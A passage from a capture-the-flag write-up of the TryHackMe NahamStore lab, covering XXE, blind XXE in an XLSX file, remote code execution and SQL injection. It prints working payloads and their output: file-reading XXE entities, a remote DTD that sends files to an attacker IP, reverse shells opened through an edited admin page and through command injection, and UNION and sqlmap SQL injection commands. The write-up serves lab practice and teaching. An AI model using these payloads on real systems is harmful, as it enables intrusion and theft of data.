User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml; charset=utf-8
Content-Length: 36
X-Token: 1337

<?xml version="1.0"?>
<data><X-Token>anything </X-Token></data>
```

**Response:**
```xml
<?xml version="1.0"?>
<data><error>X-Token anything is invalid</error></data>
```

**We can see that the `X-Token` is being reflected, which means it's vulnerable to XXE, or XML external entity injection.**

**I'll try a XXE payload in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#detect-the-vulnerability):**

**Burp Suite Request:**
```
POST /product/1?xml HTTP/1.1
Host: stock.nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml; charset=utf-8
Content-Length: 36
X-Token: 1337

<!DOCTYPE replace [<!ENTITY xxe "XXE payload"> ]>
<data><X-Token>&xxe; </X-Token></data>
```

**Response:**
```xml
<?xml version="1.0"?>
<data><error>X-Token XXE payload is invalid</error></data>
```

It works! Let's retrive the `/flag.txt`!

**Burp Suite Request:**
```
POST /product/1?xml HTTP/1.1
Host: stock.nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml; charset=utf-8
Content-Length: 36
X-Token: 1337

<?xml version="1.0"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///flag.txt'>]>
<data><X-Token>&xxe; </X-Token></data>
```

**Response:**
```xml
<?xml version="1.0"?>
<data><error>X-Token {Redacted}
 is invalid</error></data>
```

2. Blind XXE Flag

**At the Recon section, we discovered `/staff` and `uploads` directory in `nahamstore.thm`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# gobuster dir -u http://nahamstore.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100              
[...]                       
/staff                (Status: 200) [Size: 2287]                           
/uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a48.png)

**Which allows me to upload a `xlsx` file.**

> XLSX is a spreadsheet file that zipped with XML file inside.

According to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-inside-xlsx-file), we can use `XXE inside XLSX file`.

**To exploit it, we can:**

- Create a new spreadsheet file via LibreOffice Calc or Microsoft Excel:

```
┌──(root🌸siunam)-[~/…/thm/ctf/NahamStore]
└─# file blind_xxe.xlsx 
blind_xxe.xlsx: Microsoft Excel 2007+
```

- Extract XML file via `7z`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# 7z x -oXXE blind_xxe.xlsx    
```

- Add the XXE payload into `xl/workbook.xml`.

**workbook.xml:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.18.61.134/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

- Rebuild the spreadsheet file:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# cd XXE

┌──(root🌸siunam)-[~/…/thm/ctf/NahamStore/XXE]
└─# 7z u ../blind_xxe.xlsx *
```

- Build a `xxe.dtd` file:

> Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files. (Source: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-inside-xlsx-file))

```dtd
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://10.18.61.134/%d;'>">
```

- Host the `xxe.dtd` file via python's `http.server` module:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Upload the XLSX file to `nahamstore.thm/staff`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a49.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a50.png)

**We received a GET request for `xxe.dtd`:**
```
10.10.46.5 - - [21/Sep/2022 04:36:33] "GET /xxe.dtd HTTP/1.0" 200 -
```

But the `/etc/passwd` is missing. Looks like there is a filter or restriction.

**To bypass that, I'll change the dtd payload from `file:///etc/passwd` to `php://filter/convert.base64-encode/resource=/flag.txt`.**

**xxe.dtd:**
```dtd
<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://10.18.61.134/%d;'>">
```

```
10.10.46.5 - - [21/Sep/2022 04:33:36] "GET /xxe.dtd HTTP/1.0" 200 -
10.10.46.5 - - [21/Sep/2022 04:33:36] code 404, message File not found
10.10.46.5 - - [21/Sep/2022 04:33:36] "GET /e2Q2YjIy{Redacted}3ZDhmfQo= HTTP/1.0" 404 -
```

**Successfully retrieved the `flag.txt` in base64 encoded! Let's decode that!**
```
┌──(root🌸siunam)-[~/…/thm/ctf/NahamStore/XXE]
└─# echo "e2Q2YjIy{Redacted}3ZDhmfQo=" | base64 -d
{Redacted}
```

# Task 9 - RCE

```
Find ways to run commands on the webserver. You'll find the flags in /flag.txt
```

1. First RCE flag

**In the Recon section, we also find that there is another HTTP port on 8000:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
[...]
8000/tcp open  http    syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
```

**We can also see that it has a `robots.txt` file, which reveals the `/admin` directory:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://nahamstore.thm:8000/          
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://nahamstore.thm:8000/robots.txt
User-agent: *
Disallow: /admin
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl -vv http://nahamstore.thm:8000/admin/
[...]
< Location: /admin/login
```

**It redirects me to `/admin/login`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a51.png)

**We can try to guess the admin password:**

- Username: admin
- Password: admin

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a52.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a53.png)

We're in! :D

**In the `Actions`, we can edit one of those campaign:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a54.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a55.png)

Hmm... **What if I can modify the code into a PHP reverse shell?**

**I'll use a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a56.png)

**Now, setup a `nc` listener, click the `Update` button:**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# nc -lnvp 443        
listening on [any] 443 ...
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a57.png)

**Trigger the PHP reverse shell via browsing `marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a58.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# nc -lnvp 443        
listening on [any] 443 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.46.5] 50764
Linux af11c847d4c7 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:50:30 up  4:11,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami;hostname;id;ip a
www-data
af11c847d4c7
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.4/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
$ 
```

We're `www-data`!

```
$ cat flag.txt
{Redacted}
```

2. Second RCE flag

**In the IDOR section, we found that the `/pdf-generator` suffers an IDOR vulnerbility, and it's also vulnerable to RCE (Command injection)!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a59.png)

**Burp Suite:**
```
POST /pdf-generator HTTP/1.1
[...]

what=order&id=5
```

**In here, we can also execute arbitrary command by using `$(<cmd_here>)`**

**Proof-of-Concept:**
```
POST /pdf-generator HTTP/1.1
[...]

what=order&id=5$(cat+/etc/passwd)
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a60.png)

**To get a reverse shell, I'll:**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# nc -lnvp 443
listening on [any] 443 ...
```

- Send a PHP reverse shell: (Generated from https://www.revshells.com/)

**Payload:**
```
what=order&id=5$(php+-r+'$sock%3dfsockopen("10.18.61.134",443)%3bexec("/bin/bash+<%263+>%263+2>%263")%3b')
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.46.5] 48502
whoami;hostname;id;ip a
www-data
2431fe29a4b0
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

We're `www-data`!

```
cat /flag.txt
{Redacted}
```

We can also see that there are some interesting subdomains that we haven't found: `2431fe29a4b0`, `nahamstore-2020.nahamstore.thm`, `nahamstore-2020-dev.nahamstore.thm`.

```
cat /etc/hosts
127.0.0.1   localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2  2431fe29a4b0
127.0.0.1       nahamstore.thm
127.0.0.1       www.nahamstore.thm
172.17.0.1      stock.nahamstore.thm
172.17.0.1      marketing.nahamstore.thm
172.17.0.1      shop.nahamstore.thm
172.17.0.1      nahamstore-2020.nahamstore.thm
172.17.0.1      nahamstore-2020-dev.nahamstore.thm
10.131.104.72   internal-api.nahamstore.thm
```

**Let's add them to our `/etc/hosts`:**
```
10.10.46.5 nahamstore.thm www.nahamstore.thm shop.nahamstore.thm marketing.nahamstore.thm stock.nahamstore.thm 2431fe29a4b0.nahamstore.thm nahamstore-2020.nahamstore.thm nahamstore-2020-dev.nahamstore.thm
```

# Task 10 - SQL Injection

```
There are 2 SQL Injection vulnerabilities somewhere in the NahamStore domain. One will return data to the page and the other is blind. The flags can be found in the database tables called sqli_one & sqli_two in the column name flag.
```

1. Flag 1

**In the `nahamstore.thm/product` page, the `id` GET parameter is vulnerable to error-based SQL injection:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a61.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a62.png)

Armed with this information, we can know that **it's using MySQL as the DBMS (Database Management System).**

**Let's test the `Union` statement:**
```sql
0 UNION SELECT 1,2,3,4,5-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a63.png)

**Found 5 columns are required.**

**According to this task's description, there are 2 tables:**

- sqli_one
- sqli_two

**And they have column name called `flag`.**

**We can just retrieve the flag!**
```sql
0 UNION SELECT NULL,flag,NULL,NULL,NULL FROM sqli_one-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a64.png)

2. Flag 2 ( blind )

In here, I was stuck at this question for a long time. **Eventually, I found that the `/return` page may vulnerable to blind SQL injection.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a65.png)

**Burp Suite:**
```
POST /returns HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3990123990120436949628345358
Content-Length: 415
Origin: http://nahamstore.thm
Connection: close
Referer: http://nahamstore.thm/returns
Cookie: session=fc4f6eaf7957088e0d9fe056b2e2a6c3; token=0f38267b38db8aa506f05119e72bae57
Upgrade-Insecure-Requests: 1

-----------------------------3990123990120436949628345358
Content-Disposition: form-data; name="order_number"

1
-----------------------------3990123990120436949628345358
Content-Disposition: form-data; name="return_reason"

2
-----------------------------3990123990120436949628345358
Content-Disposition: form-data; name="return_info"

test
-----------------------------3990123990120436949628345358--

```

**My theory is: When I supply the `order_number` and click `Create Return`, the database will fetch the `order_number` item's data.**

> Since dealing with blind SQL injection manually will be insanely painful, I'll use `sqlmap` to automatic that process.

**To do so, I'll:**

- Intercept the POST request in Burp Suite, and save the request to a file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a66.png)

- Run `sqlmap` with `-r` option:

**Confirming it's vulnerable to blind SQL injection:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# sqlmap -r req.txt
[...]
[05:46:50] [INFO] (custom) POST parameter 'MULTIPART order_number' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[...]
```

- Enumerate database name:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# sqlmap -r req.txt --dbms=mysql --batch --threads 10 --current-db
[...]
[05:52:27] [INFO] retrieved: nahamstore             
current database: 'nahamstore'
```

**Found database name: `nahamstore`**

- Retrieve the flag:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# sqlmap -r req.txt --dbms=mysql --batch --threads 10 -D nahamstore -T sqli_two -C flag --dump
[...]
Database: nahamstore
Table: sqli_two
[1 entry]
+------------------------------------+
| flag                               |
+------------------------------------+
| {Redacted}                         |
+------------------------------------+
```

We finally completed this room!!

# Conclusion

What we've learned:

1. Subdomain Enumeration
2. Directory Enumeration
3. Content Discovery
4. Fuzzing GET & POST parameter
5. XSS (Cross-Site Scripting)
6. XSS Bypasses
7. Stored XSS, Reflected XSS
8. Open Redirect
9. CSRF (Cross-Site Request Forgery)
10. CSRF Protection Bypasses
11. IDOR (Insecure Direct Object Reference)
12. LFI (Local File Inclusion)
13. LFI Bypasses
14. SSRF (Server-Side Request Forgery)
15. SSRF Bypasses
16. XXE (XML External Entity Injection)
17. Blind XXE via XLSX File
18. RCE (Remote Code Execution)
19. Password Guessing
20. Editing a Page to Get PHP Reverse Shell
21. Command Injection
22. Error-Based SQL Injection
23. Blind-Based SQL Injection